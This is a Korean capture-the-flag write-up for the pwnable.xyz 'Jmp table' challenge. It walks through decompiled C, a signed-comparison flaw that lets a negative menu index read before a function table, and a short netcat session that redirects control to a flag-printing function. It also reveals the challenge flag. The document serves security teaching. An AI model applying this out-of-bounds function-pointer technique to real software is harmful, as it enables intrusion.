# [pwnable.xyz] Jmp table

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Should have let the compiler do it.
>
> Release: [Jmp table.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8937474/Jmp.table.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/174524995-cc763adf-4b99-467e-b9c9-70c29bef85b3.png)

## Analysis

### `_()`

```c
int _()
{
  return system("cat /flag");
}
```

`_()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int op; // [rsp+Ch] [rbp-4h]

  setup(argc, argv, envp);
  while ( 1 )
  {
    print_menu();
    printf("> ");
    op = read_long();
    if ( op <= 4 )
      break;
    puts("Invalid.");
  }
  vtable[op]();
}
```

`op`를 입력받고, 그에 따라 `vtable`을 참조하여 함수를 호출한다.

![image](https://user-images.githubusercontent.com/104156058/174526398-5586dfcd-aae3-4c8f-832b-5c43c87613fc.png)

`vtable`에는 5개의 함수가 있다.

#### 1. Malloc

```c
void *do_malloc()
{
  void *result; // rax

  printf("Size: ");
  size = read_long();
  result = malloc(size);
  if ( result )
    heap_buffer = result;
  else
    heap_buffer = (void *)1;
  return result;
}
```

`size`를 입력받고, `malloc()`으로 메모리를 할당한다. 할당된 메모리의 주소를 전역 변수 `heap_buffer`에 저장한다.

### 2. Free

```c
void do_free()
{
  if ( heap_buffer == (void *)1 )
  {
    puts("Not allocated.");
  }
  else
  {
    free(heap_buffer);
    heap_buffer = (void *)1;
  }
}
```

`heap_buffer`에 있는 주소의 메모리를 할당 해제하고, `heap_buffer`에 `1`을 넣는다.

### 3. Read

```c
int do_read()
{
  if ( heap_buffer == (void *)1 )
    return puts("Not allocated.");
  else
    return read(0, heap_buffer, size);
}
```

`heap_buffer`에 있는 주소의 메모리에 `size`만큼 입력을 받는다.

### 4. Write

```c
int do_write()
{
  if ( heap_buffer == (void *)1 )
    return puts("Not allocated.");
  else
    return write(1, heap_buffer, size);
}
```

`heap_buffer`에 있는 주소의 메모리에 있는 값을 `size`만큼 출력한다.

### 0. Exit

```c
void __noreturn do_exit()
{
  puts("Bye.");
  exit(1);
}
```

`exit(1)`로 프로그램을 종료한다.

## Exploit

`main()`에서 `op`는 `4`보다 작거나 같아야 한다는 조건밖에 없기 때문에, 음수를 입력할 수 있어서 OOB 취약점이 발생한다.

![image](https://user-images.githubusercontent.com/104156058/174527126-6b4ae7ce-14e0-4259-b4d4-ab112af9fe3b.png)

메모리를 보면, `vtable`의 앞쪽에 `size`가 위치해 있고, 여기에는 원하는 값을 쓸 수 있다. `size`에 `_()`의 주소를 넣고 `op`에 `-2`를 입력하면, `vtable[-2]`, 즉 `size`에 있는 함수가 호출되어 플래그를 획득할 수 있다.

```
$ nc svc.pwnable.xyz 30007
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> 1
Size: 4196913
1. Malloc
2. Free
3. Read
4. Write
0. Exit
> -2
FLAG{signed_comparison_checked}
```